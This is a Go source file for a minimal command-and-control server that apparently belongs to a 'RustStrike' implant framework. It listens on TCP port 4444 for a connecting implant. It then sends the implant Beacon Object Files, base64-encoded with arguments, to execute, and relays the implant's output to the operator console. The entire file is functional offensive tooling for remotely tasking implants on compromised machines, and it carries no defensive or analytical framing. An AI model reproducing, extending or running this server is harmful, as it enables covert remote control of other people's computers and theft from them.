// Minimal RustStrike server in Go — speaks the same newline-JSON protocol as
// the Rust server, so the Rust implant connects and runs BOFs unchanged.
//
// Usage: go run . 4444
// Console: hello | load <bof.o> [text args...] | loadb <bof.o> <args.bin> | quit
package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"
)

// --- protocol: must match crates/protocol/src/lib.rs exactly ---
// serde tag="type" rename_all="lowercase", so the discriminator is lowercase.

// serverMsg serializes both Hello and Bof. NOTE: the Rust implant deserializes
// Bof with serde and `args` is a REQUIRED field (no #[serde(default)]) — so a
// Bof message MUST always carry "args" (empty string is fine). We therefore do
// NOT use omitempty on Args. Hello may carry an empty "args"; serde ignores
// unknown/extra fields on the Hello variant, so that's harmless.
type serverMsg struct {
	Type string `json:"type"`           // "hello" | "bof"
	File string `json:"file,omitempty"` // base64 COFF (bof only)
	Args string `json:"args"`           // base64 raw BOF arg buffer (bof only; always present)
}

type implantMsg struct {
	Type string `json:"type"` // "hello" | "output" | "error"
	Data string `json:"data"`
}

func main() {
	port := "4444"
	if len(os.Args) > 1 {
		port = os.Args[1]
	}
	ln, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[server] bind: %v\n", err)
		os.Exit(1)
	}
	fmt.Fprintf(os.Stderr, "[server] (go) listening on 0.0.0.0:%s, waiting for implant...\n", port)

	conn, err := ln.Accept()
	if err != nil {
		fmt.Fprintf(os.Stderr, "[server] accept: %v\n", err)
		os.Exit(1)
	}
	fmt.Fprintf(os.Stderr, "[server] implant connected from %s\n", conn.RemoteAddr())

	// Reader: implant -> console (live, like the Rust server fix).
	rd := bufio.NewReader(conn)
	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		scan := bufio.NewScanner(rd)
		scan.Buffer(make([]byte, 0, 1024*1024), 4*1024*1024) // BOF output can be large
		for scan.Scan() {
			line := strings.TrimSpace(scan.Text())
			if line == "" {
				continue
			}
			var m implantMsg
			if err := json.Unmarshal([]byte(line), &m); err != nil {
				fmt.Printf("[server] unparseable line (%v): %s\n", err, line)
				continue
			}
			switch m.Type {
			case "hello":
				fmt.Printf("[implant] hello: %s\n", m.Data)
			case "output":
				fmt.Printf("[implant] output: %s\n", m.Data)
			case "error":
				fmt.Printf("[implant] error: %s\n", m.Data)
			default:
				fmt.Printf("[implant] %s: %s\n", m.Type, m.Data)
			}
		}
		if err := scan.Err(); err != nil && err != io.EOF {
			fmt.Fprintf(os.Stderr, "[server] read error: %v\n", err)
		}
	}()

	// Writer: console stdin -> implant.
	wr := bufio.NewWriter(conn)
	in := bufio.NewScanner(os.Stdin)
	for in.Scan() {
		cmd := strings.TrimSpace(in.Text())
		if cmd == "" {
			continue
		}
		if cmd == "quit" || cmd == "exit" {
			break
		}
		msg, ok := parseCommand(cmd)
		if !ok {
			fmt.Fprintf(os.Stderr, "[server] unknown command: %q\n", cmd)
			fmt.Fprintln(os.Stderr, "  commands: hello | load <bof.o> [text args...] | loadb <bof.o> <args.bin> | quit")
			continue
		}
		b, _ := json.Marshal(msg)
		wr.Write(b)
		wr.WriteByte('\n')
		if err := wr.Flush(); err != nil {
			fmt.Fprintf(os.Stderr, "[server] send failed: %v\n", err)
			break
		}
	}
	conn.Close()
	wg.Wait()
	fmt.Fprintln(os.Stderr, "[server] bye.")
}

// parseCommand mirrors the Rust server's hello/load/loadb semantics.
func parseCommand(cmd string) (serverMsg, bool) {
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		return serverMsg{}, false
	}
	switch parts[0] {
	case "hello":
		return serverMsg{Type: "hello"}, true
	case "load":
		// load <bof.o> [text args...]  -> args = base64(utf8 text)
		if len(parts) < 2 {
			return serverMsg{}, false
		}
		bof, err := os.ReadFile(parts[1])
		if err != nil {
			return serverMsg{}, false
		}
		textArgs := ""
		if len(parts) > 2 {
			textArgs = strings.Join(parts[2:], " ")
		}
		return serverMsg{
			Type: "bof",
			File: base64.StdEncoding.EncodeToString(bof),
			Args: base64.StdEncoding.EncodeToString([]byte(textArgs)),
		}, true
	case "loadb":
		// loadb <bof.o> <args.bin>  -> args = base64(raw bytes)
		if len(parts) < 2 {
			return serverMsg{}, false
		}
		bof, err := os.ReadFile(parts[1])
		if err != nil {
			return serverMsg{}, false
		}
		argsB64 := ""
		if len(parts) >= 3 {
			if ab, err := os.ReadFile(parts[2]); err == nil {
				argsB64 = base64.StdEncoding.EncodeToString(ab)
			}
		}
		return serverMsg{
			Type: "bof",
			File: base64.StdEncoding.EncodeToString(bof),
			Args: argsB64,
		}, true
	}
	return serverMsg{}, false
}
